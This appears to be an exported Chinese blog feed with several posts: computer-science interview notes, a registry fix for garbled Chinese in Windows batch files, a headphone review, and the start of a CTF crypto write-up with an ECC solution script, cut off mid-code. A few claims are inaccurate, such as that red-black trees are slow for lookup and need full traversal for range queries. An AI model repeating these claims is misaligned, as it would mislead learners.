<h1 id="介绍一下-ARP-协议"><a href="#介绍一下-ARP-协议" class="headerlink" title="介绍一下 ARP 协议"></a>介绍一下 ARP 协议</h1><p>ARP（Address Resolution Protocol）协议是用于将网络层地址（IP地址）转换为链路层地址（MAC地址）的协议。在进行数据传输之前，需要先获得目标设备的 MAC 地址，才能将数据包通过网络传递到目标设备。这就是 ARP 协议的作用。</p>
<p>具体来说，当一台计算机在发送数据时，会先检查其 ARP 缓存，查看目标设备的 MAC 地址是否已经存在。如果已经存在，则将数据包封装成链路层帧，直接发送给目标设备。如果目标设备的 MAC 地址未知，则需要进行 ARP 请求。</p>
<p>ARP 请求是以广播形式发送的，即发送给本网络内所有的设备。请求中包含发送方的 IP 地址和 MAC 地址，以及目标设备的 IP 地址。当目标设备收到 ARP 请求时，会返回一个 ARP 应答，包含其 MAC 地址。此时发送方就可以获得目标设备的 MAC 地址，并将数据包封装成链路层帧发送给目标设备。</p>
<p>需要注意的是，ARP 协议是基于广播的，因此会产生一定的网络负载。此外，ARP 缓存中的条目是有时限的，一旦过期就需要重新进行 ARP 请求。由于 ARP 协议没有进行认证，因此容易受到 ARP 欺骗攻击。</p>
<h1 id="数据库为什么不用红黑树而用-B-树"><a href="#数据库为什么不用红黑树而用-B-树" class="headerlink" title="数据库为什么不用红黑树而用 B+ 树"></a>数据库为什么不用红黑树而用 B+ 树</h1><ol>
<li>磁盘 I/O 效率：相对于红黑树而言，B+ 树可以更好地利用磁盘块的大小，一次 I/O 读取更多的节点，从而降低 I/O 的次数，提高查询效率。</li>
<li>数据查询效率：B+ 树是一种多路搜索树，因此在进行数据查询时，可以很快定位到需要查找的数据节点。而红黑树的查找时间复杂度为 O(log n)，相对较慢。</li>
<li>数据范围查询：在数据库中，我们常常需要进行范围查询，例如查询某个区间内的所有数据。B+ 树可以支持按照范围进行数据查询，而红黑树则需要对整个树进行遍历。</li>
<li>内存占用：相对于红黑树而言，B+ 树的每个节点可以存储更多的关键字，因此在内存占用方面更加优秀。</li>
</ol>
<h1 id="介绍一下单例设计模式"><a href="#介绍一下单例设计模式" class="headerlink" title="介绍一下单例设计模式"></a>介绍一下单例设计模式</h1><p>单例设计模式是一种创建型设计模式，它保证一个类只有一个实例，并提供了一个全局访问该实例的入口。</p>
<p>在单例设计模式中，类的构造函数被私有化，以防止外部直接通过构造函数创建多个实例。同时，该类提供一个静态方法用于获取该类唯一的实例。在该方法中，会先判断是否已经存在该实例，如果已经存在则直接返回该实例，如果不存在则创建一个新实例并返回。</p>
<p>单例模式主要用于控制实例的数量，避免不必要的内存占用和对象创建。它可以提供一个全局的访问点，方便其他模块或类访问该实例。在多线程环境下，需要注意线程安全，可以通过加锁或双重检查等方式来保证线程安全。</p>
<p>需要注意的是，单例模式虽然有很多优点，但是也存在一些缺点。例如，单例模式会增加代码的复杂度和可读性，同时也会增加测试的难度。因此，应该在确实需要控制实例数量时才使用单例模式。</p>
<h1 id="介绍一下-B-树和-B-树"><a href="#介绍一下-B-树和-B-树" class="headerlink" title="介绍一下 B 树和 B+ 树"></a>介绍一下 B 树和 B+ 树</h1><p>B 树和 B+ 树都是一种多路平衡查找树，主要用于在磁盘等外存储介质上进行数据的高效组织和访问。</p>
<p>B 树是一种平衡树，每个节点可以有多个子节点，通常用于数据库索引等场景。B 树的每个节点中存储的数据是该节点所有子节点中最大或最小的值。在查找时，从根节点开始，依次查找满足条件的子节点，直到找到目标数据或到达叶子节点。</p>
<p>B+ 树是在 B 树的基础上进行改进的，相对于 B 树，B+ 树的所有数据都存储在叶子节点上。每个节点中只存储关键字，而不存储数据，数据只存储在叶子节点上，从而可以减少非叶子节点的磁盘 I/O 次数。在 B+ 树中，叶子节点之间有一个双向链表连接，可以方便地进行范围查询操作。同时，B+ 树的内部节点可以存储更多的关键字，相对于 B 树可以更好地利用磁盘块的大小，从而提高查询效率。</p>
<p>总体来说，B 树和 B+ 树都是一种非常重要的数据结构，它们可以很好地解决在磁盘等外存储介质上进行数据组织和访问的问题。在实际应用中，需要根据具体场景选择适合的树型结构。</p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>计算机基础</tag>
      </tags>
  </entry>
  <entry>
    <title>让批处理文件中的中文正常显示</title>
    <url>/2021/05/11/%E8%AE%A9%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%87%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA/</url>
    <content><![CDATA[<p>最近在学习DOS命令和批处理相关内容的时候，遇到了点问题，就是在执行包含中文的批处理文件时，中文无法正常显示，在查阅了相关资料之后，了解了一些编码相关的内容。</p>
<span id="more"></span>

<p><img src="/2021/05/11/%E8%AE%A9%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%87%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA/cmd%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81.png"></p>
<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><h2 id="编码相关的那些事"><a href="#编码相关的那些事" class="headerlink" title="编码相关的那些事"></a>编码相关的那些事</h2><p>现在主要的两种编码格式为UTF-8和ANSI。</p>
<blockquote>
<p>ANSI是一种字符代码，为使计算机支持更多语言，通常使用 0x00~0x7f 范围的1 个字节来表示 1 个英文字符。超出此范围的使用0x80~0xffff来编码，即扩展的ASCII编码。</p>
</blockquote>
<p>为了应对不同国家和地区的使用，ANSI编码存在很多不同的标准：由于汉字的种类非常多，而一个字节（Byte）最多只能表示<strong>2^8 = 256</strong>种文字与符号，这肯定是远远不够的。因此在中国、日本、韩国等采用象形字符的地区，通常采用<em>双字节字符集</em>的方式来表示文字符号，即采用两个字节来表示一个字符。在简体中文系统下采用的是<em>GBK标准</em>，比如汉字“字”就使用[0xd7,0xd6]两个字节进行存储。系统会根据计算机语言来确定ANSI的标准，当然也可用手动更改。</p>
<blockquote>
<p>UTF-8（8位元，Universal Character Set/Unicode Transformation Format）是针对Unicode的一种可变长度字符编码。它可以用来表示Unicode标准中的任何字符，而且其编码中的第一个字节仍与ASCII相容，使得原来处理ASCII字符的软件无须或只进行少部分修改后，便可继续使用。因此，它逐渐成为电子邮件、网页及其他存储或传送文字的应用中，优先采用的编码。</p>
</blockquote>
<p>UTF-8相较于ANSI最大的特点就是采用了可变长度的编码方式，相较于ANSI对任何字符都采用固定长度编码，UTF-8可对不同范围内的字符使用不同长度的编码，比如英文中一个字符就用一个字节表示，而汉语则使用三个字节，使得不同的文字都可以以一套通用的标准进行编码，这保证了不同语言的系统中编码的通用性。</p>
<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>查看文本编辑器的编码格式，发现采用的是UTF-8的编码格式，但是win10系统控制台的默认编码格式为ANSI编码，与文本编码格式不符合，导致计算机用ANSI的标准去对采用了UTF-8编码的文本进行解释，结果自然就产生了乱码。</p>
<p><img src="/2021/05/11/%E8%AE%A9%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%87%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA/notepad++.png"></p>
<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>可以将文本的编码格式改为与控制台编码一致，这里建议都改为ANSI编码，因为UTF-8编码格式下的控制台的提示信息为英文。这里在更改了文件的编码格式为ANSI并重新编辑文本后，中文显示正常。</p>
<p><img src="/2021/05/11/%E8%AE%A9%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%87%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA/%E6%AD%A3%E5%B8%B8.png"></p>
<p>当然如果你想保证指令的通用性，批处理文件仍要采用UTF-8的编码格式，可以选择更改控制台的编码格式，以下给出了两种<strong>将控制台编码格式更改为UTF-8的方法</strong>。</p>
<h3 id="方法1：注册表编辑器修改"><a href="#方法1：注册表编辑器修改" class="headerlink" title="方法1：注册表编辑器修改"></a>方法1：注册表编辑器修改</h3><h4 id="Step1：打开注册表编辑器"><a href="#Step1：打开注册表编辑器" class="headerlink" title="Step1：打开注册表编辑器"></a>Step1：打开注册表编辑器</h4><p>可以直接在Win10搜索框中搜索关键字“注册表”打开，也可以Win+R运行“<strong>Regedit</strong>”。</p>
<h4 id="Step2：找到相应的数据并更改"><a href="#Step2：找到相应的数据并更改" class="headerlink" title="Step2：找到相应的数据并更改"></a>Step2：找到相应的数据并更改</h4><p>找到 <strong>HKEY_CURRENT_USER\Console%SystemRoot%_system32_cmd.exe</strong> 并将其更改为65001（十进制）或fde9（十六进制）。</p>
<p><img src="/2021/05/11/%E8%AE%A9%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%87%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA/%E6%B3%A8%E5%86%8C%E8%A1%A8.png"></p>
<h3 id="方法2：运行注册表脚本"><a href="#方法2：运行注册表脚本" class="headerlink" title="方法2：运行注册表脚本"></a>方法2：运行注册表脚本</h3><p>可以直接将方法1的操作编写为一个脚本操作，代码如下：</p>
<pre class="language-none"><code class="language-none">Windows Registry Editor Version 5.00
[HKEY_CURRENT_USER\Console\%SystemRoot%_system32_cmd.exe]
&quot;CodePage&quot;&#x3D;dword:0000fde9</code></pre>

<p>复制到新建文本文件并将拓展名改为“.reg”，运行。</p>
]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>经验</tag>
        <tag>批处理</tag>
        <tag>编码格式</tag>
        <tag>Windows10</tag>
        <tag>注册表</tag>
      </tags>
  </entry>
  <entry>
    <title>自用耳机盘点</title>
    <url>/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/</url>
    <content><![CDATA[<p>最近几个月看了不少耳机相关的内容，初步了解了一些耳机的参数指标以及选购方案，同时也给自己使用的耳机进行了一波更新换代。本文就简单盘点一下自己之前用过的和现在正在使用的耳机，内容完全基于个人的使用体验。</p>
<span id="more"></span>

<h1 id="已退役"><a href="#已退役" class="headerlink" title="已退役"></a>已退役</h1><h2 id="赛睿-Arctis9x"><a href="#赛睿-Arctis9x" class="headerlink" title="赛睿 Arctis9x"></a>赛睿 Arctis9x</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/9x.jpg"></p>
<p>主要是为了无线连接 xbox 而购入。买之前看了不少网上的评价，包括视频评测以及 RTINGS 网站上的测试，感觉很不错，但是这耳机并没有国行版本，而且海外版售价高达 200 美元，对我而言实在是太贵，就在淘宝花 398 购入了一副所谓的“9成新”的“洋垃圾”。</p>
<p>单就产品本身的素质来说，我觉得还是很不错的。尽管作为游戏耳机，但它的音乐表现依然非常出色，三频的表现十分均衡。参考 RTINGS 网站上对于 9x 的评测，其中 Neutral Sound 项评分高达 7.8 分并给出了 “satisfactory” 的评价。麦克风质量也相当不错，这根可伸缩的麦克风虽小，但却拥有优秀的收音质量和降噪能力，不过我也只是拿到手的时候测试了一下，并没有怎么使用。佩戴方面，耳机头梁采用了松紧带的设计，使得佩戴时不至于压头。耳罩不算很透气，夏天佩戴可能会比较热，但好在相对柔软，网上普遍说赛睿 arctis  系列这套模具比较夹头，我感觉也稍微有点，但在可接受的范围之内。总之，作为游戏耳机，我对 9x 的表现还是相当满意的。</p>
<p>但由于是二手产品，电池不可避免的有一定程度的损耗，我这副看上去损耗还比较大，官方标称的 20 小时续航，我实际使用大概只能撑六七个小时。另外，使用了不到一年之后，连接耳机头梁和发声单元的转轴就出现了松动的情况，最开始也没怎么在意，但结果是越用越松，直到耳机已经无法稳固佩戴，晃动耳机还能听到断裂的塑料碎片的声音，应该是转轴内部物理结构的损坏。上网上一看，原来是比较普遍的现象，就挺无语的。尝试在淘宝找耳机维修，发现价格还挺贵的，想想还是算了，只能无奈将其退役了。</p>
<h2 id="Xbox-官方有线头戴"><a href="#Xbox-官方有线头戴" class="headerlink" title="Xbox 官方有线头戴"></a>Xbox 官方有线头戴</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/xbox.jpg"></p>
<p>9x 退役之后，就想着找一个接替它的游戏头戴，在使用 9x 的过程中，我发现无线对我而言好像并不是那么重要，而且无线耳机还得时刻关注电量，以及考虑长期使用后电池损耗的问题，因此我这次主要把目光放在了有线头戴上。</p>
<p>在雷蛇噬魂鲨有线和 Xbox 官方有线的纠结中，我最终还是选择了后者。现在想想，主要原因可能还是因为 Xbox 的外观设计更合我意以及期待官方配件的玄学加成（？？）。旋钮式音量调节、可弯曲收纳的麦克风以及 Xbox 标志性的绿色线材共同构成了这副耳机极简主义的设计。至少在外观部分，我还是比较喜欢的。</p>
<p>但耳机的实际使用体验不能说糟糕，却也很难让人满意。佩戴方面，耳罩是蛋白皮材质，触感还算 ok，也不夹头，但可能正因为不夹头，耳机的佩戴牢固性主要依靠压在头上的头梁来提供，佩戴时间稍长头部就会有很明显的不适感，因此佩戴方面的体验是很不理想的。音质表现也是完全没有达到要求，无论是风格还是素质都和之前使用的 9x 有比较明显的差距。调音风格上，9x 整体是偏向中高频的，听上去会比较亮，而 Xbox 有线则是偏向于中低频，声音非常的沉闷，刚拿到手听的时候就感觉非常不适应，与我的听音偏好很不匹配。素质上来说，9x 基本是完爆 Xbox 有线，毕竟二者其实本就不是一个价位段的产品，无论是解析力还是声场，前者相比后者都有非常明显的优势。之前我有对比过在游戏《荒野大镖客1》中同一个场景二者的声音表现，结果就是能够在 9x 中听到的一些非常微弱、具有方向感的环境声在 Xbox 有线中与游戏的场景音乐混作一团，丢失了大量细节。</p>
<p>最终，还是决定挂闲鱼出掉了。</p>
<h2 id="原道系列"><a href="#原道系列" class="headerlink" title="原道系列"></a>原道系列</h2><p>由于本人晚上睡觉时有收听电台的习惯，因此一副价格便宜、纯听个响的功能性耳机很有必要。因此号称听了触发“悔恨之泪”的原道就成为了我的首选。</p>
<p>原道系列这几年我也陆陆续续买了好多副了，包括最早散装的原道无迹，以及后来二次元封面的原道酱。最早的散装版本现在仍然在售，不过个人不太推荐，主要原因是线材质量不太行，我有好几副都是用了几个月之后出现了线材老化的情况，然后随之而来的就是耳机只有一边出声，不得不进行更换。后面出的原道酱在线材质量上有很大提升，我手里这条铜线版本用了一年多依然正常。不过作为我睡觉时佩戴的耳机，佩戴舒适度必然也要考虑其中，原道的这款平头塞采用了与经典的森海塞尔 mx500 相同的模具，声学结构设计上就很优秀，可能这也是原道在如此低的价位具备还不错的声音表现的重要原因，但是其在佩戴舒适度方面实在一般，耳机腔体不算小，长时间佩戴的情况下能感觉到由于塑料腔体与耳道硬接触而产生的硌痛感，戴上海绵套能相对缓解，但海绵套又很容易松动，时不时就会脱落，比较麻烦。</p>
<p>后来也有尝试过他家的 x39 微动圈，但是佩戴实在不牢固，稍微翻个身可能就掉了，另外入耳式也不适合长时间佩戴，容易出现中耳炎的症状，因此最终放弃。</p>
<h1 id="现役"><a href="#现役" class="headerlink" title="现役"></a>现役</h1><h2 id="飞利浦-SHP9500"><a href="#飞利浦-SHP9500" class="headerlink" title="飞利浦 SHP9500"></a>飞利浦 SHP9500</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/9500.jpg"></p>
<p>由于个人打游戏还是比较习惯头戴式耳机，因此在上述两幅头戴都退役之后就想着找一副音质出色、佩戴舒适的替代品。在各大论坛和评论区逛了一段时间，发现了一个反复被提到的名字：飞利浦 SHP9500，同时了解到这是一副开放式头戴，由于我之前并没有听过开放式头戴耳机的声音，对此比较好奇，加上价格也不算高，因此我也没有过多犹豫，就在闲鱼花 170 多淘了一副成色很不错的。</p>
<p>到手试听了一下，发现与此前听过的封闭式头戴的感受截然不同，声音非常通透干净，声场极其开阔，用通俗的语言来形容就是你能感受到各种乐器的声音分布在你耳朵的不同方位，临场感十足。这样开阔的声场也非常适合游玩大型 3A 游戏，能够很大程度上增加代入感。但是开放式也有很大的局限性，就是糟糕的隔音性能以及严重的漏音问题，这也意味着这类耳机的基本只能在比较私人的空间和场合使用，比较遗憾。</p>
<p>另一个令人印象深刻的点便是它的佩戴体验，个人使用过的头戴耳机不多，9500 绝对是其中佩戴最为舒适的无之一。耳机的可调节范围很大，加上透气且足够大的耳罩，使得大部分人都能通过简单调整获得一个比较舒适的佩戴感受，既不夹头也不压头，连续佩戴数个小时也不会感到疲劳。</p>
<p>最后要吐槽的一点就是原装线材虽然质感不错，但实在是太长了，足足有 3 米，我在使用了一段时间后还是嫌麻烦，自己买了一根飞利浦的 1.5 米编制线材，做工还算不错，与 9500 搭配也比较合适。</p>
<h2 id="水月雨-兰"><a href="#水月雨-兰" class="headerlink" title="水月雨 兰"></a>水月雨 兰</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/lan.jpg"></p>
<p>其实单论音质，9500 已经完全能够满足我的需求了，但是毕竟是开放式头戴，使用场景非常有限，就想着再入一副音质出色、方便携带、能够让我出门在外享受音乐的耳塞式耳机。作为我的候选产品的有 Nicehck DB2、兴戈 EW200、水月雨 竹2，以及我最终选择了的水月雨 兰，原因无外乎两点：平直中正的调音和优雅的外观。</p>
<p>首先是音质，购买前看网上评价说兰整体的调音取向是偏监听向的，低频不够有力，但个人平时听 ACG 音乐多一些，主要偏向于中高频，因此调音方面还算比较符合我的听音取向。拿到手后果然如此，并且解析力很强，不同乐器之间的分离度做得非常好，除了物理结构所限的声场外，整体听感已经很接近 9500 了，足以胜任个人的便携音乐耳机。</p>
<p>促使我选择兰的一个另外一个很重要的原因便是它的外观，当时在产品介绍页面第一眼看到便喜欢上了。不仅在于耳机腔体极简风格的设计，更在于原装线材与其共同搭配所表现出的一体性。线材的颜色本就与耳机本体风格很搭，还在分线处和插头部分使用了粉末冶金工艺，并配上兰标志性的 logo，进一步增强了耳机的质感，整体外观非常符合我的审美。</p>
<h2 id="苹果-Earpods"><a href="#苹果-Earpods" class="headerlink" title="苹果 Earpods"></a>苹果 Earpods</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/earpods.jpg"></p>
<p>个人现役的功能性耳机，也是我现在日常使用最多的耳机。</p>
<p>作为功能性耳机，佩戴舒适度必然是首先需要考虑的问题，earpods 在这方面可谓是相当优秀。轻盈的重量、贴耳的腔体以及光滑的材质共同造就了近乎无感的佩戴体验，以至于直到今天仍然有相当多的厂商模仿 earpods 的外观设计，可以说以一己之力开辟了半入耳式这个全新的赛道。</p>
<p>虽说个人主要把它当作功能性耳机来使用，但这并不意味着 earpods 的声音表现不行，相反，它的三频表现足够均衡，足以满足个人的大多数的影音需求。另外得益于开放式的设计，earpods 作为一副耳塞式耳机，拥有比其他封闭耳塞式耳机更加开阔的声场，整体的听感也更通透。</p>
<p>另外虽然个人使用的不多，但 earpods 这个不起眼的线控麦克风也值得一说。这个麦克风虽小，但却拥有相当不错的收音质量，参考 RTINGS 上的评分，earpods 的 Recording Quality 项高达 8.1 分，这个成绩已经达到了很多游戏耳机的水平，足以应付语音通话和线上会议的需求，缺点就是噪音抑制一般，需要在尽量安静的环境中使用。</p>
<p>官方 149 元的售价肯定称不上足够便宜以至于当消耗品来使用，但由于这款耳机已经发售多年，并且质量足够出色，以至于在二手市场上的保有量非常可观，基本上 50 ~ 60 元的价格就能淘到一副成色很不错的。因此只要能够接受二手，earpods 还是一个相当具有性价比的选择。</p>
<h2 id="红米-Airdots3pro"><a href="#红米-Airdots3pro" class="headerlink" title="红米 Airdots3pro"></a>红米 Airdots3pro</h2><p><img src="/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/redmi.jpg"></p>
<p>红米的这副 TWS 还是 21 年的时候买的，但是个人使用的其实并不多。</p>
<p>耳机的质感还算比较出色，佩戴体验也很不错，比较牢固且舒适。声音表现放现在来看是比较糟糕的，整体的听感比较闷，即使切换到高音增强模式也没有太大改善，当然也可能与个人的听音喜好有关，总之对我而言，拿它来听音乐并不是一个好的选择。但毕竟是注重便携的 TWS，音质方面我也没有抱太高的期望，主要还是使用体验方面的问题。首先便是续航，我这副尽管使用并不频繁，但单次续航大概只有 3 ~ 4 个小时了，如果全程开启降噪或通透模式的话肯定会更低，加上充电仓后的总续航时间个人没有统计过，不过应该也不会太乐观。此外，不知道是什么原因，我总感觉在开启降噪模式后时不时会出现左右耳压不一致的情况，不知道是不是软件 bug，总之相当影响体验。最后就是耳机麦克风貌似只支持通话时调用，其他应用无法调用，因此诸如微信视频通话和录音等场合只能使用手机自带麦克风，原因不明。</p>
<p>虽说 airdots3pro 的使用体验放今天来看并不理想，但我目前并没有打算更换，毕竟我现在还是更习惯有线耳机即插即用、不用担心电量问题的省心感。</p>
]]></content>
      <categories>
        <category>数码</category>
      </categories>
      <tags>
        <tag>闲谈</tag>
        <tag>经验</tag>
        <tag>数码</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次CTF校赛</title>
    <url>/2021/12/04/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%A0%A1%E8%B5%9B/</url>
    <content><![CDATA[<p>本文记录一下刚刚结束的CTF校赛，感觉本次校赛题目出得实在有点坑，但也算学到了不少东西。</p>
<span id="more"></span>

<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="easy-ECC"><a href="#easy-ECC" class="headerlink" title="easy_ECC"></a>easy_ECC</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><pre class="language-none"><code class="language-none">已知椭圆曲线加密Ep(a,b)参数为

p &#x3D; 15424654874903

a &#x3D; 305423748

b &#x3D; 315284355172

G(15079176652031,83237376468)

私钥为

k &#x3D; 655321

求公钥K(x,y)</code></pre>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>常规的椭圆曲线加密问题，直接根据加密原理编写解密程序，得到两个结果。根据问题提示，考虑 flag 为两数的异或结果。</p>
<h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> A <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> B
    <span class="token keyword">if</span> B <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> A
    x1<span class="token punctuation">,</span> y1 <span class="token operator">=</span> A
    x2<span class="token punctuation">,</span> y2 <span class="token operator">=</span> B
    <span class="token keyword">if</span> A <span class="token operator">!=</span> B<span class="token punctuation">:</span>
        λ <span class="token operator">=</span> <span class="token punctuation">(</span>y2 <span class="token operator">-</span> y1<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x2 <span class="token operator">-</span> x1<span class="token punctuation">)</span><span class="token punctuation">,</span> p <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        λ <span class="token operator">=</span> <span class="token punctuation">(</span>x1 <span class="token operator">*</span> x1 <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> y1<span class="token punctuation">,</span> p <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    x3 <span class="token operator">=</span> λ <span class="token operator">*</span> λ <span class="token operator">-</span> x1 <span class="token operator">-</span> x2
    y3 <span class="token operator">=</span> λ <span class="token operator">*</span> <span class="token punctuation">(</span>x1 <span class="token operator">-</span> x3<span class="token punctuation">)</span> <span class="token operator">-</span> y1
    <span class="token keyword">return</span> <span class="token punctuation">(</span>x3 <span class="token operator">%</span> p<span class="token punctuation">,</span> y3 <span class="token operator">%</span> p<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> <span class="token number">15424654874903</span>
    a <span class="token operator">=</span> <span class="token number">305423748</span>
    b <span class="token operator">=</span> <span class="token number">315284355172</span>
    G <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">15079176652031</span><span class="token punctuation">,</span> <span class="token number">83237376468</span><span class="token punctuation">)</span>
    k <span class="token operator">=</span> <span class="token number">655321</span>
    C <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>
        C <span class="token operator">=</span> add<span class="token punctuation">(</span>C<span class="token punctuation">,</span> G<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>C<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> C<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>

<h3 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h3><p>本题没有什么特别之处，就是标准的椭圆曲线加密问题的求解，重点在于理解椭圆曲线加密的原理。</p>
<h2 id="Read-the-Message"><a href="#Read-the-Message" class="headerlink" title="Read_the_Message"></a>Read_the_Message</h2><h3 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># python 3.7</span>

<span class="token keyword">import</span> base64
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token string">"init_key"</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s_box <span class="token operator">=</span> init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    crypt <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span>  crypt
<span class="token keyword">def</span> <span class="token function">init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">return</span> s_box
<span class="token keyword">def</span> <span class="token function">excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
